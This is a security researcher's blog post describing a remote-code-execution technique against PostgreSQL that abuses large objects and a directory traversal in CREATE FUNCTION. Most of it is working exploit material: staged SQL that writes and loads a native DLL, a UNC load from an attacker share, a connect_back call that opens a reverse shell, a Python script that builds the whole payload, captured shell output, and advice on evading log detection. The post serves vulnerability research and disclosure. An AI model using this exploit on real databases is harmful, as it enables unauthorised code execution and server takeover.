---
layout: post
title: "SQL Injection Double Uppercut :: How to Achieve Remote Code Execution Against PostgreSQL"
date: 2020-06-26 09:00:00 -0500
categories: blog
excerpt_separator: <!--more-->
---

<img class="excel" alt="Postgres" src="/assets/images/sql-injection-double-uppercut-how-to-achieve-remote-code-execution/pg.png">
<p class="cn" markdown="1">When I was researching exploit primitives for the SQL Injection vulnerabilities discovered in [Cisco DCNM](/blog/2020/01/14/busting-ciscos-beans-hardcoding-your-way-to-hell.html), I came across a generic technique to exploit SQL Injection vulnerabilties against a PostgreSQL database. When developing your exploit primitives, it's always prefered to use an *application technique*, that doesn't rely on some other underlying technology.</p>

<!--more-->

<p class="cn">TL;DR</p>

<p class="cn" markdown="1">*I share yet another technique to achieve remote code execution against PostgreSQL Database.*</p>

<p class="cn" markdown="1">An application technique would be the ability to compromise the database integrity and leverage the trust between the application code and the database. In the case of Cisco DCNM, I found 4 different techniques, 2 of which I blogged about (directory traveral and deserialization).</p>

## Prior Research

<p class="cn" markdown="1">Although I didn't know it at the time, [Jacob Wilkin](https://twitter.com/Jacob_Wilkin) had [reported a simpler approach](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) to achieving code execution against PostgreSQL by (ab)using [copy from program](https://www.postgresql.org/docs/12/sql-copy.html). Recently, Denis Andzakovic also [detailed](https://pulsesecurity.co.nz/articles/postgres-sqli) his way of gaining code execution against PostgreSQL as well by (ab)using read/writes to the `postgresql.conf` file.</p>

<p class="cn" markdown="1">I was planning on sitting this technique, but since Denis exposed the power of `lo_export` for exploitation, I figured one more nail on the coffin wouldn't hurt ;-></p>

<p class="cn" markdown="1">I did some testing and discovered that under windows, the NETWORK_SERVICE cannot modify the `postgresql.conf` file, so Denis's technique is *nix specific. However, his technique doesn't require stacked queries, making it powerful in certain contexts.</p>

## CREATE FUNCTION obj_file Directory Traversal

<div markdown="1" class="cn">
- CVE: N/A
- CVSS: 4.1 [(AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?calculator&version=3.0&vector=(AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L))
</div>

### Environment

<p class="cn" markdown="1">This technique works on both *nix and Windows but does require stacked queries since we are leveraging the [create function](https://www.postgresql.org/docs/12/sql-createfunction.html) operative.</p>

### Summary

<p class="cn" markdown="1">On the latest versions of PostgreSQL, the `superuser` is no longer allowed to load a shared library file from anywhere else besides `C:\Program Files\PostgreSQL\11\lib` on Windows or `/var/lib/postgresql/11/lib` on *nix. Additionally, this path is **not writable** by either the NETWORK_SERVICE or postgres accounts.</p>

<p class="cn" markdown="1">However, an authenticated database `superuser` can write binary files to the filesystem using "large objects" and can of course write to the `C:\Program Files\PostgreSQL\11\data` directory. The reason for this should be clear, for updating/creating tables in the database.</p>

<p class="cn" markdown="1">The underlying issue is that the `CREATE FUNCTION` operative allows for a directory traversal to the data directory! So essentially, an authenticated attacker can write a shared library file into the data directory and use the traversal to load the shared library. This means an attacker can get native code execution and as such, execute arbitrary code.</p>

### Attack Flow

<p class="cn" markdown="1">**Stage 1 -** We start by creating an entry into the `pg_largeobject` table.</p>

```sql
select lo_import('C:/Windows/win.ini', 1337);
```

<p class="cn" markdown="1">We could have easily used a UNC path here (and skip step 3), but since we want a platform independant technique, we will avoid this.</p>

<p class="cn" markdown="1">**Stage 2 -** Now we modify the `pg_largeobject` entry to contain a complete extension. This extension needs to be compiled against the exact major version of the target PostgreSQL database as well as matching its architecture.</p>

<p class="cn" markdown="1">For a file that is > 2048 bytes in length, the `pg_largeobject` table uses the `pageno` field. So we must break our file up into chunks of size 2048 in bytes.</p>

```sql
update pg_largeobject SET pageno=0, data=decode(4d5a90...) where loid=1337;
insert into pg_largeobject(loid, pageno, data) values (1337, 1, decode(74114d...));
insert into pg_largeobject(loid, pageno, data) values (1337, 2, decode(651400...));
...
```

<p class="cn" markdown="1">It maybe possible to skip stage 1 (and only performing a single statement execution for stage 2) by using [object identifier types](https://www.postgresql.org/docs/8.1/datatype-oid.html) within PostgreSQL, but I have not had the time to confirm this.</p>

<p class="cn" markdown="1">**Stage 3 -** Now we can write our binary into the data directory. Remember, we can't use traversals here since that is checked, but even if we could, strict file permissions for the NETWORK_SERVICE account exist and we have limited options.</p>

```sql
select lo_export(1337, 'poc.dll');
```

<p class="cn" markdown="1">**Stage 4 -** Now, let's trigger the loading of the library.</p>

<p class="cn" markdown="1">I demonstrated in a class I taught a few years back that you can use fixed paths (including UNC) to load extensions against PostgreSQL version 9.x, thus gaining native code execution. [@zerosum0x0](https://twitter.com/zerosum0x0) [demonstrated this](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html) by using the file write technique with a fixed path on the filesystem. But back then, permissions on the filesystem were not as restrictive.</p>

```sql
create function connect_back(text, integer) returns void as '//attacker/share/poc.dll', 'connect_back' language C strict;
```

<p class="cn" markdown="1">However, a few years passed and the PostgreSQL developers decided to block fix paths and alas, that technique is now dead. But we can simply traverse from the lib directory and load our extension! The underlying code of the `create function` appends the `.dll` string, so don't worry about appending it:</p>

```sql
create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
```

<p class="cn" markdown="1">**Stage 5 -** Trigger your reverse shell.</p>

```sql
select connect_back('192.168.100.54', 1234);
```
			
### Things to consider

<div markdown="1" class="cn">
- You can load DllMain also, but pwning your error log is a one way ticket to detection!
- As mentioned, you will need to compile the dll/so file using the same PostgreSQL version including architecture.
- You can download the extension I used [here](https://github.com/sourceincite/tools/blob/master/pgpwn.c) but you will need to compile it yourself.
</div>

### Fun Facts

<p class="cn" markdown="1">ZDI initially aquired this case but never published an advisory and I was later told me that the vendor wasn't patching it since it's considered a *feature not a bug*.</p>

### Automation

<p class="cn" markdown="1">This code will generate a poc.sql file to run on the database as the superuser. Example:</p>

```
steven@pluto:~/postgres-rce$ ./poc.py 
(+) usage ./poc.py <connectback> <port> <dll/so>
(+) eg: ./poc.py 192.168.100.54 1234
steven@pluto:~/postgres-rce$ ./poc.py 192.168.100.54 1234 si-x64-12.dll
(+) building poc.sql file
(+) run poc.sql in PostgreSQL using the superuser
(+) for a db cleanup only, run the following sql:
    SELECT lo_unlink(l.oid) FROM pg_largeobject_metadata l;
    DROP FUNCTION connect_back(text, integer);
steven@pluto:~/postgres-rce$ nc -lvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 192.168.100.122 49165 received!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files\PostgreSQL\12\data>whoami
nt authority\network service

C:\Program Files\PostgreSQL\12\data>
```

```py
#!/usr/bin/env python3
import sys

if len(sys.argv) != 4:
    print("(+) usage %s <connectback> <port> <dll/so>" % sys.argv[0])
    print("(+) eg: %s 192.168.100.54 1234 si-x64-12.dll" % sys.argv[0])
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
lib = sys.argv[3]
with open(lib, "rb") as dll:
    d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
    start = i * 2048
    end   = (i+1) * 2048
    if i == 0:
        sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
    else:
        sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
    end   = (i+1) * 2048
    sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, 'poc.dll');"
sql += "create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;"
sql += "select connect_back('%s', %d);" % (host, port)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
    sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function connect_back(text, integer);")
```

## References

<div markdown="1" class="cn">
- [https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html)
- [https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
- [https://pulsesecurity.co.nz/articles/postgres-sqli](https://pulsesecurity.co.nz/articles/postgres-sqli)
</div>
